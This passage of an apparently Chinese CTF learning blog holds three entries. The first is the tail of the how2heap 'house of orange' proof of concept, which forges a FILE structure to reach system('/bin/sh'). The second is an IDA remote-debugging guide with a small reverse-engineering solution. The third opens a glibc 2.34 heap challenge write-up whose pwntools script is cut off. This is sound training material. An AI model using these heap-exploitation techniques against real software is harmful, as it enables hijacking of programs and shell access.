 In the usual scenario, the heap looks like the following</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |------------|------------|------...----|</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |    chunk   |    chunk   | Top  ...    |</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |------------|------------|------...----|</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      heap start                              heap end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       And the new area that gets allocated is contiguous to the old heap end.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       which is basically a temporary chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       After the size of the Top chunk has been updated, this chunk gets freed.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       In our scenario however, the heap looks like</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     heap start                            heap end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       So the area between the second chunk and the heap end is unused.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       And the old Top chunk gets freed.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       it gets added to list of unsorted bins.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Now we request a chunk of size larger than the size of the top chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       This forces sysmalloc to be invoked.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       And ultimately invokes _int_free</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Finally the heap looks like this:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     heap start                                             new heap end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Note that the above chunk will be allocated in a different page</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      that gets mmapped. It will be placed after the old heap&#x27;s end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Here starts phase two of the attack. We assume that we have an overflow into the old</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      top chunk so we could overwrite the chunk&#x27;s size.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      of this chunk in the unsorted bin list.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      There are two common ways to exploit the current state:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        - Use the unlinking of the chunk for an *where*-controlled write of the</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          libc&#x27;s main_arena unsorted-bin-list. (requires at least one allocation)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The former attack is pretty straight forward to exploit, so we will only elaborate</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The attack is pretty stunning, as it exploits the abort call itself, which</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      is triggered when the libc detects any bogus state of the heap.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Whenever abort is triggered, it will flush all the file pointers by calling</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      _IO_list_all and calling _IO_OVERFLOW on them.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      _IO_OVERLOW points to system and whose first 8 bytes are set to &#x27;/bin/sh&#x27;, so</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#x27;/bin/sh&#x27;).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      More about file-pointer exploitation can be found here:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      currently point to the libc&#x27;s main_arena.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    io_list_all = top[<span class="hljs-number">2</span>] + <span class="hljs-number">0x9a8</span>;<br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      We plan to overwrite the fd and bk pointers of the old top,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      which has now been added to the unsorted bins.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      When malloc tries to satisfy a request by splitting this free chunk</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      in libc&#x27;s main_arena.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      case.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br> <br><br>    top[<span class="hljs-number">3</span>] = io_list_all - <span class="hljs-number">0x10</span>;<br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      At the end, the system function will be invoked with the pointer to this file pointer.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    <span class="hljs-built_in">memcpy</span>( ( <span class="hljs-type">char</span> *) top, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>, <span class="hljs-number">8</span>);<br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      in _IO_list_all.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Since we can only overwrite this address with main_arena&#x27;s unsorted-bin-list,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      the idea is to get control over the memory at the corresponding fd-ptr.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The address of the next file pointer is located at base_address+0x68.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      This corresponds to smallbin-4, which holds all the smallbins of</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      sizes between 90 and 98. For further information about the libc&#x27;s bin organisation</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Since we overflow the old top chunk, we also control it&#x27;s size field.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Here it gets a little bit tricky, currently the old top chunk is in the</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      in this list first, therefore, iterates over the list.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      therefore, occupying the smallbin[4] location in the main_arena and</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      eventually representing the fake file pointer&#x27;s fd-ptr.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      In addition to sorting, malloc will also perform certain size checks on them,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      so after sorting the old top chunk and following the bogus fd pointer</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      to _IO_list_all, it will check the corresponding size field, detect</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      and finally triggering the abort call that gets our chain rolling.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Here is the corresponding code in the libc:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    top[<span class="hljs-number">1</span>] = <span class="hljs-number">0x61</span>;<br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Now comes the part where we satisfy the constraints on the fake file pointer</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      required by the function _IO_flush_all_lockp and tested here:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      We want to satisfy the first condition:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    FILE *fp = (FILE *) top;<br><br><br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    fp-&gt;_mode = <span class="hljs-number">0</span>; <span class="hljs-comment">// top+0xc0</span><br><br><br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    fp-&gt;_IO_write_base = (<span class="hljs-type">char</span> *) <span class="hljs-number">2</span>; <span class="hljs-comment">// top+0x20</span><br><br>    fp-&gt;_IO_write_ptr = (<span class="hljs-type">char</span> *) <span class="hljs-number">3</span>; <span class="hljs-comment">// top+0x28</span><br><br><br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      4) Finally set the jump table to controlled memory and place system there.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The jump table pointer is right after the FILE struct:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      base_address+sizeof(FILE) = jump_table</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    <span class="hljs-type">size_t</span> *jump_table = &amp;top[<span class="hljs-number">12</span>]; <span class="hljs-comment">// controlled memory</span><br><br>    jump_table[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) &amp;winner;<br><br>    *(<span class="hljs-type">size_t</span> *) ((<span class="hljs-type">size_t</span>) fp + <span class="hljs-keyword">sizeof</span>(FILE)) = (<span class="hljs-type">size_t</span>) jump_table; <span class="hljs-comment">// top+0xd8</span><br><br><br><br><br><br>    <span class="hljs-comment">/* Finally, trigger the whole chain by calling malloc */</span><br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">10</span>);<br><br><br><br>   <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     The libc&#x27;s error message will be printed to the screen</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     But you&#x27;ll get a shell anyways.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   */</span><br><br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">winner</span><span class="hljs-params">(<span class="hljs-type">char</span> *ptr)</span><br><br>&#123; <br><br>    system(ptr);<br><br>    syscall(SYS_exit, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Pwn：从入门到入坟</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>学习用IDA远程调试ELF文件</title>
    <link href="/2022/07/06/Re/IDA_remote_dbg/"/>
    <url>/2022/07/06/Re/IDA_remote_dbg/</url>
    
    <content type="html"><![CDATA[<h2 id="How-to-IDA-remote-dbg"><a href="#How-to-IDA-remote-dbg" class="headerlink" title="How to IDA_remote_dbg"></a>How to IDA_remote_dbg</h2><ol><li><p>找到IDA安装目录下，dbgsrv目录中的<code>linux_server</code>（32位程序）和<code>linux_server64</code>（64位程序），将文件拖到虚拟机里，并保证和需要调试的文件在同一目录下。</p></li><li><p>使用命令赋权限并检查：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod 777 linux_server64<br>./linux_server64<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">出现以下消息即为成功</span><br>IDA Linux 64-bit remote debug server(ST) v7.7.27. Hex-Rays (c) 2004-2022<br>Listening on 0.0.0.0:23946...<br></code></pre></td></tr></table></figure></li><li><p>在IDA的Debugger中选择<code>Remote Linux Debugger</code>。</p></li><li><p>在<code>process options</code>中做配置，具体如下：</p><ul><li>Application 》文件地址</li><li>Input file 》文件地址</li><li>Directory 》文件所在目录</li><li>Parameters 》无需更改</li><li>Hostname 》虚拟机的ip</li><li>Port 》无需改动，默认为23946即可</li><li>Password 》虚拟机密码</li></ul><p>查找ip的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">ip addr<br><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    link/ether 00:0c:29:76:f2:4a brd ff:ff:ff:ff:ff:ff<br>    altname enp2s1<br>    inet 192.168.188.132/24 brd 192.168.188.255 scope global dynamic noprefixroute ens33<br>       valid_lft 1589sec preferred_lft 1589sec<br>    inet6 fe80::4bb0:bbb3:b3d1:1a28/64 scope link noprefixroute <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure></li><li><p>先在虚拟机里启动dbg，再在IDA中启动调试即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./linux_server64<br></code></pre></td></tr></table></figure></li></ol><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>题目流程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">181</span>; ++i )<br>    judge[i] ^= <span class="hljs-number">0xC</span>u;<span class="hljs-comment">// judge是位于data段上的一个数组</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input flag:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%20s&quot;</span>, s);<br>  v5 = <span class="hljs-built_in">strlen</span>(s);<br>  <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">14</span> &amp;&amp; (*(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> (__fastcall **)(<span class="hljs-type">char</span> *))judge)(s) )<span class="hljs-comment">// judge变为了函数</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Right!&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>何为__fastcall？这是一种调用约定，可以说函数的调用约定，其第一个和第二个DWORD参数通过ecx和edx传递，除此调用约定以外，还有一些常见的调用约定：stdcall、cdecl、thiscall、nakedcall。</p><p>可以看到在调用judge函数之前，对judge的字节进行了异或操作，使得我们难以用静态分析的方法来分析其流程，采用动静结合，在其进行了异或操作之后下断点，通过动调，发现了judge的真面目：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">judge</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">char</span> v2[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [rsp+8h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">char</span> v3[<span class="hljs-number">9</span>]; <span class="hljs-comment">// [rsp+Dh] [rbp-1Bh] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+24h] [rbp-4h]</span><br><br>  qmemcpy(v2, <span class="hljs-string">&quot;fmcd&quot;</span>, <span class="hljs-number">4</span>);<br>  v2[<span class="hljs-number">4</span>] = <span class="hljs-number">127</span>;<br>  qmemcpy(v3, <span class="hljs-string">&quot;k7d;V`;np&quot;</span>, <span class="hljs-keyword">sizeof</span>(v3));<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">13</span>; ++i )<br>    *(_BYTE *)(i + a1) ^= i;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">13</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *(_BYTE *)(i + a1) != v2[i] )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>WP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&#x27;&#x27;&#x27;fmcd\x7Fk7d;V`;np&#x27;&#x27;&#x27;</span><br>rt = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>    rt += <span class="hljs-built_in">chr</span>(<br>        <span class="hljs-built_in">ord</span>(s[i]) ^ i<br>    )<br><br><span class="hljs-built_in">print</span>(rt)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Re：yy真的逆不动</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2022 ciscn 复赛</title>
    <link href="/2022/07/03/CTF_competition/2022ciscn_again/"/>
    <url>/2022/07/03/CTF_competition/2022ciscn_again/</url>
    
    <content type="html"><![CDATA[<h2 id="duck"><a href="#duck" class="headerlink" title="duck"></a>duck</h2><p>一道glibc2.34的经典堆题，存在uaf的漏洞，学习两种利用方法。</p><blockquote><p>参考文章：<a href="http://blog.nsfocus.net/glibc-234/">浅谈glibc新版本保护机制及绕过方法 – 绿盟科技技术博客 (nsfocus.net)</a></p></blockquote><h3 id="IO利用-IO-doallocbuf"><a href="#IO利用-IO-doallocbuf" class="headerlink" title="IO利用(_IO_doallocbuf)"></a>IO利用(_IO_doallocbuf)</h3><p>首先修改IO_doallocbuf为one_gadget，然后清空stdout结构体指针，使得libc重新调用IO_doallocbuf函数。</p><blockquote><p>第一次做glibc2.34的tcache有点不太熟练，比赛最后one_gadget错了，就差临门一脚，有点可惜。≧ ﹏ ≦</p></blockquote><p>WP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span> :<br>sh = process([<span class="hljs-string">b&quot;./ld.so&quot;</span>, <span class="hljs-string">b&quot;./pwn&quot;</span>], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">b&quot;./libc.so.6&quot;</span>&#125;)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">2</span> :<br>    sh = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">else</span> :<br>sh = remote(ip, port)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span 